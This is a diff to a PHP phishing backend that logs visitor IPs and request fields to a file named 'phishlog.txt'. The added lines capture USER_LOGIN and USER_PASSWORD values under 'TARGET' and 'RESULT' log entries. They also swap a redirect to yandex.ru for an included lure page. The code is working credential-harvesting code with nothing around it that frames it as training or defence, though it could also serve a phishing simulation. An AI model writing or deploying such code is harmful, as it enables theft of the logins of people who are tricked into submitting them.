@@ -4,9 +4,11 @@
 $LOGFILE = '../../topsecret/phishlog.txt';
 $URLRedirect = 'https://yandex.ru';
 $CodedParamName = 'userid';
-$ResultMarker = 'download';
-$AttachmentLocation = '../../topsecret/test.xls';
+$CleanParamNames = array("USER_LOGIN", "USER_PASSWORD");
+$ResultMarker = 'visit';
+$AttachmentLocation = '../../topsecret/doc.xls';
 $AttachmentPrefix = 'dmsterms_';
+$PageInclude = '../../topsecret/page.html';
 ########################################
 function exceptions_error_handler($severity, $message, $filename, $lineno) {
     throw new ErrorException($message, 0, $severity, $filename, $lineno);
@@ -33,6 +35,7 @@ $Identity = '';
 $DehexDict = array();
 $ErrorDict = array();
 $LOG = '';
+$RESULT = '';
 
 $actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 $ip = getenv('REMOTE_ADDR');
@@ -87,8 +90,11 @@ if ($key == $CodedParamName) {
     } catch(Throwable $ex) {
         $ErrorDict[] = $value;
     }
+} elseif (in_array($key, $CleanParamNames)) {
+    $DehexDict[$key] = $value;
+    $LOG .= "TARGET POST Field: ".$key.":".$value."\n\r";
 } else {
-    $LOG .= "POST Field \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";    
+    $LOG .= "POST Field \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";
 }
 }
 
@@ -104,13 +110,19 @@ if ($key == $CodedParamName) {
     } catch(Throwable $ex) {
         $ErrorDict[] = $value;
     }
+} elseif (in_array($key, $CleanParamNames)) {
+    $DehexDict[$key] = $value;
+    $LOG .= "TARGET GET Field: ".$key.":".$value."\n\r";
 } else {
     $LOG .= "GET Field \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";
 }
 }
 
-foreach($DehexDict as $value) {
-    $LOG .= "RESULT: ".htmlspecialchars($value).":".$ResultMarker."\n\r";
+foreach($DehexDict as $key => $value) {
+    $RESULT .= $key.":".$value.";";
+}
+if (!empty($RESULT)) {
+    $LOG .= "RESULT: ".$ResultMarker.";".$today.";".$ip.";".$RESULT."\n\r";
 }
 foreach($ErrorDict as $value) {
     $LOG .= "DECODE ERRORS: ".htmlspecialchars($value).":".$ResultMarker."\n\r";
@@ -120,7 +132,8 @@ $LOG .= "--------------------------------------\n\r";
 @file_put_contents($LOGFILE, $LOG, FILE_APPEND);
 
 # Вернуть перенаправление или файл
-answer("redirect", $URLRedirect, $AttachmentLocation, $AttachmentPrefix, $Identity);
+#answer("redirect", $URLRedirect, $AttachmentLocation, $AttachmentPrefix, $Identity);
 #answer("file", $URLRedirect, $AttachmentLocation, $AttachmentPrefix, $Identity);
+include($PageInclude);
 #exit;
 ?>
